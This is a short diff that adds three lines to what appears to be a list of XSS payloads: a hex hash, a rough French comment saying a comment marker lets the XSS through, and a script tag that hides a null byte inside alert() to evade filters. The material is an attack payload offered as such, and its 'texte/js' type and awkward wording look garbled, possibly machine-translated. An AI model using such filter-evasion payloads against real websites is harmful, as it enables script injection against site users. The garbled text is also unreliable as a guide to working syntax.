@@ -1,0 +1,3 @@
+0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E
+commentaire marquer <script type="texte/js"></script> faire passer l xss
+<script type="texte/js">a%00lert("ze")</script>
